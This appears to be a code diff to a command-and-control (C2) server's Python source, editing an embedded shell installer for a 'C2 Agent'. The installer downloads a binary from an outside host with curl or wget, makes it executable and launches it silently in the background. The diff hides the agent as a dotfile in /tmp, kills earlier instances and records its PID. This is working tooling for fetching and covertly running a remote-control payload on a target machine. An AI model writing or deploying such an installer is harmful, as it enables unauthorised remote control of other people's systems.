@@ -320,6 +320,9 @@ def dashboard():
 # ─── install scripts ─────────────────────────────────────────────────
 INSTALL_SH = r"""#!/bin/sh
 set -e
+AGENT="/tmp/.c2_agent"
+kill "$(cat /tmp/.c2_pid 2>/dev/null)" 2>/dev/null || true
+rm -f "$AGENT"
 echo "[*] C2 Agent installer"
 case "$(uname -s)" in
   Linux)  OS="linux"  ;;
@@ -335,15 +338,16 @@ esac
 URL="${C2_AGENT_URL:-https://c2.trazento.site/agent/linux/$ARCH}"
 echo "[*] Downloading $URL"
 if command -v curl >/dev/null 2>&1; then
-  curl -sS -o /tmp/c2_agent "$URL"
+  curl -sS -o "$AGENT" "$URL"
 elif command -v wget >/dev/null 2>&1; then
-  wget -q -O /tmp/c2_agent "$URL"
+  wget -q -O "$AGENT" "$URL"
 else
   echo "need curl or wget"; exit 1
 fi
-chmod +x /tmp/c2_agent
+chmod +x "$AGENT"
 echo "[*] Starting agent in background..."
-nohup /tmp/c2_agent >/dev/null 2>&1 &
+nohup "$AGENT" >/dev/null 2>&1 &
+echo "$!" > /tmp/.c2_pid
 echo "[+] Agent running (PID $!)"
 """
 
